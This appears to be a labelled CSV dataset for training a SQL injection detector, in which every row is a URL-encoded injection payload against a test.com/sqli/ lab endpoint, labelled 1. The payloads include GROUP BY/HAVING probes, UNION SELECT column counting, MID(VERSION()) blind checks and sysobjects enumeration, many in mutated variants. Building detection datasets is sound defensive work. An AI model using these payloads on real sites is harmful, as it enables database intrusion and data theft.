URI,label
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D%271%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+mname+having+1%27%3D1%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+table.email+,+table.mname+having+1%27%3D1+--&Submit=Submit#",1
test.com/sqli/?id=%27+GROUP+BY+columnnames+1%27%3D1+--&Submit=Submit#,1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+lname+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+fname+,+lname+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=+GROUP+BY+fname+,+lname+%27%271%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+%271%27%27%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+fname+,+email+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%271%27%3D1%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D%27%271%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D%27%271%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%27%271%27%3D%27%271%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+%27%271%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+id+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+password+,+id+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+fname+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+lname+,+fname+having+1%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%271%27%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%27%27%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+password+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+password,++fname+having+90%3D70+&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+fname+,+having+%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+fname+,+having+90%3D70%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+90%27%3D70%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+%27%27%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+password+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%25+GROUP+BY+mname+,+password+.+fname+having+%27%27%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1%27%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+1%3D%271%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D%27%27%271+--&Submit=Submit#",1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=--1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=---1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=--1%27%27%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2B&Submit=Submit#,1
test.com/sqli/?id=%271%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=-%271%27%27+UNION+SELECT+1%2C2%2C3%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--+--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C8%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--+--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+SELECT+1%2C2%2C3%2C70%2C60--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C25%2C40%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%271=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%271=1%27%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C4%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%271+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C67--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C67--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C2%2C7%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+ALL+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C3%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C1%2C9%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C5%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C7%2C0%2C1%2C2%2C100--%2B&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28id+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28mname+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28id+%29+from+dvwa&Submit=Submit#,1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+mname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28email+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+email+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+,+id+%29+from+dvwa+--&Submit=Submit#",1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%29%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%%28%2929%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%277%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%27%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%29%29%2C1%2C1%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%29%29%29%29%2C1%2C1%29+%3D+%271%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%28%28%28%29%29%29%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C5%2C5%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28VERSION%28%29%2C5%2C5%29%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28VERSION%28%29%2C5%2C5%29%29%28+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%2720%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%27%291%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28%28VERSION%28%29%2C5%2C5%29%29%29%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C5%2C5%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28%28%28VERSION%28%29%2C5%2C5%29%29%29+%3D+%27%271%27=%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%27300%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C100%2C100%29+%3D+%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%271=1%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+1=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+1=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%27%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C90%2C700%29+%3D+%2760%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+%2760%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+1=1%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%29%2C90%2C700%29+%3D+1=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%28%29%29%29%2C90%2C700%29+%3D+%271=1%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28VERSION%28%28%29%29%2C90%2C700%29+%3D+%27%27%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=%28%28VERSION%28%28%29%29%2C90%2C700%29%29+%3D+%27%27%271=1%27%27%3B&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28name%29+from+sysobjects+where+xtype+%3D+%27U%27+and+name+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+1+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27%27%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27%27+in+%28select+min%28id%29+from+sysobjects+where+xtype+%3D+%27%27U%27+and+id+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+U+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%27%27+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+.%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%%2727+and+fname+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+%27%271%27%27+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27%27U%%2727+and+fname+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=+and+80+in+%28select+min%28fname%29+from+sysobjects+where+xtype+%3D+%27U%27+and+fname+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+600+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+1+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%271+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27.%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+U+and+email+%3E+%27.%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27%27.%27%27%29+--&Submit=Submit#,1
test.com/sqli/?id=and+%27%271%27+in+%28select+min%28email%29+from+sysobjects+where+xtype+%3D+%27U%27+and+email+%3E+%27%27.%27%29+--&Submit=Submit#,1
